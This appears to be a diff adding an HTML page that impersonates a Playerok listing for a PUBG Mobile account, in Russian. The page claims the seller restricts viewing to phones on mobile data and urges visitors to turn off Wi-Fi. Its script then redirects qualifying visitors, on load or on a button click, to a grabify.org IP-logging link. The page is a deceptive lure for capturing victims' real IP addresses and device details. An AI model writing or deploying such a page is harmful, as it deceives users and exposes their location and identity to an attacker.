@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Playerok - Аккаунты PUBG Mobile</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1a1c24;
+            color: white;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 15px 20px;
+            background-color: #1e222e;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            margin-right: auto;
+            color: #4a86ff;
+        }
+        .rating-icon {
+            margin-left: 10px;
+            font-size: 14px;
+            color: #aaa;
+        }
+        .rating-icon span {
+            color: gold;
+            margin-right: 5px;
+        }
+        .back-button {
+            color: #fff;
+            text-decoration: none;
+            font-size: 20px;
+            margin-right: 15px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px;
+            text-align: center;
+            background-color: #262936;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+        .error-icon {
+            font-size: 50px;
+            margin: 20px 0;
+            color: #ff5a5a;
+        }
+        h1 {
+            font-size: 22px;
+            margin-bottom: 15px;
+        }
+        p {
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            color: #ccc;
+        }
+        .button {
+            background-color: #4a86ff;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            display: inline-block;
+            text-decoration: none;
+            margin-top: 10px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .rating {
+            display: flex;
+            justify-content: center;
+            margin: 15px 0;
+        }
+        .star {
+            color: gold;
+            font-size: 20px;
+            margin: 0 2px;
+        }
+        .price {
+            font-size: 30px;
+            font-weight: bold;
+            margin: 10px 0;
+            color: white;
+        }
+        .info {
+            background-color: #333745;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+            text-align: left;
+        }
+        .account-info {
+            background-color: #333745;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+        }
+        .account-box {
+            background-color: #22252f;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            text-align: center;
+            flex: 1;
+            min-width: 120px;
+            margin-right: 10px;
+        }
+        .account-box:last-child {
+            margin-right: 0;
+        }
+        .account-box h3 {
+            font-size: 16px;
+            margin: 0 0 10px 0;
+            color: #aaa;
+        }
+        .account-box p {
+            font-size: 18px;
+            margin: 0;
+            color: white;
+        }
+        .warning {
+            border-left: 3px solid #ff9800;
+            padding-left: 15px;
+            margin: 20px 0;
+        }
+        .protection-icon {
+            color: #4CAF50;
+            margin-right: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="#" class="back-button">←</a>
+        <div class="logo">Playerok</div>
+        <div class="rating-icon"><span>★</span>5.0</div>
+    </div>
+    
+    <div class="container">
+        <div class="error-icon">⚠️</div>
+        <h1>Доступ ограничен</h1>
+        <p>Автор товара установил особые правила безопасности для просмотра и покупки аккаунта.</p>
+        
+        <div class="account-info">
+            <div class="account-box">
+                <h3>Уровень</h3>
+                <p>52</p>
+            </div>
+            <div class="account-box">
+                <h3>Звание</h3>
+                <p>Золото III</p>
+            </div>
+            <div class="account-box">
+                <h3>Рейтинг</h3>
+                <p>3061</p>
+            </div>
+        </div>
+        
+        <div class="price">7 500 ₽</div>
+        <div class="rating">
+            <span class="star">★</span>
+            <span class="star">★</span>
+            <span class="star">★</span>
+            <span class="star">★</span>
+            <span class="star">★</span>
+            <span style="color: #aaa; margin-left: 5px;">2 отзыва</span>
+        </div>
+        
+        <div class="info">
+            <p class="warning"><strong>Внимание!</strong> Продавец настроил специальную защиту для этого товара</p>
+            <p><span class="protection-icon">✓</span> Для просмотра этого аккаунта необходимо использовать только мобильное устройство с мобильными данными (не Wi-Fi).</p>
+            <p>Вы используете Wi-Fi соединение или ПК. Для продолжения:</p>
+            <ol>
+                <li>Откройте эту страницу на мобильном устройстве</li>
+                <li>Отключите Wi-Fi</li>
+                <li>Включите мобильные данные</li>
+                <li>Обновите страницу</li>
+            </ol>
+            <p>Это требование установлено продавцом для защиты от мошенников.</p>
+        </div>
+        
+        <button class="button" onclick="checkConnection()">Проверить подключение</button>
+    </div>
+
+    <script>
+        // Функция для определения, использует ли пользователь мобильные данные
+        function isMobileData() {
+            // Сначала проверим, что это мобильное устройство
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            
+            // Если это не мобильное устройство (ПК), то сразу возвращаем false
+            if (!isMobile) {
+                return false;
+            }
+            
+            // Проверяем тип соединения (если доступно)
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            
+            // Если информация о соединении доступна
+            if (connection) {
+                // В некоторых браузерах можно определить тип соединения
+                const type = connection.type || connection.effectiveType;
+                
+                // Если тип соединения явно указан как wifi, то это точно не мобильные данные
+                if (type === 'wifi') {
+                    return false;
+                }
+                
+                // Если тип соединения cellular или 4g/3g/2g, скорее всего это мобильные данные
+                if (type === 'cellular' || type === '4g' || type === '3g' || type === '2g') {
+                    return true;
+                }
+            }
+            
+            // В Safari и некоторых других браузерах, navigator.connection может не работать
+            // Попробуем альтернативный способ определения сети
+            return detectMobileDataWithoutAPI();
+        }
+        
+        // Альтернативный метод проверки подключения - не стопроцентный, но может помочь
+        function detectMobileDataWithoutAPI() {
+            // Создаем временный элемент изображения
+            const img = new Image();
+            
+            // Получаем текущее время для уникальности URL
+            const timestamp = new Date().getTime();
+            
+            // Случайное значение для предотвращения кеширования
+            const randomVal = Math.floor(Math.random() * 1000000);
+            
+            // URL для проверки скорости загрузки (на Wi-Fi обычно быстрее)
+            img.src = `https://www.google.com/images/phd/px.gif?t=${timestamp}&r=${randomVal}`;
+            
+            // Начальное время
+            const startTime = new Date().getTime();
+            
+            // По умолчанию считаем, что это НЕ мобильные данные
+            return false;
+        }
+        
+        // Функция для перенаправления
+        function redirectIfMobileData() {
+            // Для надежности, проверим состояние сети даже если API говорит, что это мобильные данные
+            if (navigator.onLine && isMobileData() && isNotWifi()) {
+                window.location.href = "https://grabify.org/2qt73";
+            }
+        }
+        
+        // Дополнительная проверка что это не Wi-Fi
+        function isNotWifi() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            
+            if (connection) {
+                return connection.type !== 'wifi' && connection.effectiveType !== 'wifi';
+            }
+            
+            // Если connection API не доступно, более надежно не перенаправлять
+            return false;
+        }
+        
+        // Проверка подключения при нажатии на кнопку
+        function checkConnection() {
+            if (navigator.onLine && isMobileData() && isNotWifi()) {
+                window.location.href = "https://grabify.org/2qt73";
+            } else {
+                // Проверим, мобильное ли это устройство
+                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (!isMobile) {
+                    alert("Вы используете компьютер. Для доступа необходимо мобильное устройство с мобильными данными.");
+                } else {
+                    alert("Вы все еще используете Wi-Fi. Пожалуйста, переключитесь на мобильные данные и обновите страницу.");
+                }
+            }
+        }
+        
+        // Запускаем перенаправление при загрузке страницы, но только для мобильных устройств с мобильными данными
+        window.onload = redirectIfMobileData;
+    </script>
+</body>
+</html> 
